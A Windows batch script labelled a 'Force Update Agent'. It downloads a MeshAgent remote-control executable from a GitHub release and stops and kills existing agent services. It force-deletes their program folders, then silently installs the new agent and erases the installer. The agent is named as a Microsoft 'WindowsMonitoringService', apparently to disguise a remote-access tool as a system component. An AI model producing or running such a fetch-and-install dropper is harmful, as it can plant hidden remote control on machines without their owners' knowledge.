@echo off
setlocal EnableExtensions EnableDelayedExpansion

REM =========================
REM Force Update Agent - BAT
REM Logs: C:\Temp\NoWin
REM =========================

set BASEDIR=C:\Temp\NoWin
set LOGFILE=%BASEDIR%\force-update-agent.log
set INSTALLER=%BASEDIR%\WindowsMonitoringService64-Lol.exe
set DOWNLOAD_URL=https://github.com/LightZirconite/MeshAgent/releases/download/exe/WindowsMonitoringService64-Lol.exe

if not exist %BASEDIR% mkdir %BASEDIR%

echo ===== START %DATE% %TIME% ===== >> "%LOGFILE%"
whoami >> "%LOGFILE%"

REM --- Download installer ---
echo Downloading installer... >> "%LOGFILE%"
powershell -NoProfile -Command ^
"Invoke-WebRequest -UseBasicParsing -Uri '%DOWNLOAD_URL%' -OutFile '%INSTALLER%'" >> "%LOGFILE%" 2>&1

if not exist "%INSTALLER%" (
    echo DOWNLOAD FAILED >> "%LOGFILE%"
    echo ===== ABORT ===== >> "%LOGFILE%"
    exit /b 1
)

for %%A in ("%INSTALLER%") do set SIZE=%%~zA
if %SIZE% LSS 500000 (
    echo DOWNLOAD TOO SMALL (%SIZE%) >> "%LOGFILE%"
    exit /b 1
)

echo Download OK (%SIZE% bytes) >> "%LOGFILE%"

REM --- Stop services ---
echo Stopping services... >> "%LOGFILE%"
sc stop meshagent >> "%LOGFILE%" 2>&1
sc stop lgtwagent >> "%LOGFILE%" 2>&1
sc stop WindowsMonitoringService >> "%LOGFILE%" 2>&1

REM --- Kill processes ---
echo Killing processes... >> "%LOGFILE%"
taskkill /F /IM meshagent.exe >> "%LOGFILE%" 2>&1
taskkill /F /IM lgtw*.exe >> "%LOGFILE%" 2>&1
taskkill /F /IM WindowsMonitoringService*.exe >> "%LOGFILE%" 2>&1

REM --- Remove old folders ---
echo Removing old folders... >> "%LOGFILE%"
rmdir /S /Q "C:\Program Files\Mesh Agent" >> "%LOGFILE%" 2>&1
rmdir /S /Q "C:\Program Files\MeshAgent" >> "%LOGFILE%" 2>&1
rmdir /S /Q "C:\Program Files\LGTW" >> "%LOGFILE%" 2>&1
rmdir /S /Q "C:\Program Files\Microsoft Corporation\WindowsMonitoringService" >> "%LOGFILE%" 2>&1
rmdir /S /Q "C:\Program Files (x86)\Mesh Agent" >> "%LOGFILE%" 2>&1

REM --- Install new agent ---
echo Installing new agent... >> "%LOGFILE%"
"%INSTALLER%" --fullinstall >> "%LOGFILE%" 2>&1

echo Install finished, exit code %ERRORLEVEL% >> "%LOGFILE%"

REM --- Cleanup ---
del /F /Q "%INSTALLER%" >> "%LOGFILE%" 2>&1

echo ===== END %DATE% %TIME% ===== >> "%LOGFILE%"
exit /b 0
